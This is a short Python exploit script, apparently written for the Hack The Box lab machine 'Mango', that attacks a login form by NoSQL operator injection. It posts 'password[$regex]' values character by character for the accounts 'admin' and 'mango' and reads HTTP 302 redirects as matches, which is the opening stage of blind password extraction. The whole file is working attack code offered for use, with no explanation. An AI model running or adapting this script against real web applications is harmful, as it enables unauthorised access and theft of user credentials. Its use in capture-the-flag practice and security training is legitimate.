#!/usr/bin/python3
from requests import post
from string import printable


url = "http://staging-order.mango.htb/"

def findValidChar(name):
	valid=[]
	for ch in printable:
		regex = ch+".*"
		data = {'username':name,'password[$regex]':regex, 'login' :'login' }
		response = post(url,data=data,allow_redirects=False)
		if response.status_code == 302:
			valid.append(ch)
	return valid



if __name__ == '__main__':
	valid_admin = findValidChar('admin')
	valid_mango = findValidChar('mango')
	print("valid mango:")
	print(valid_mango)
	print("valid admin:")
	print(valid_admin)
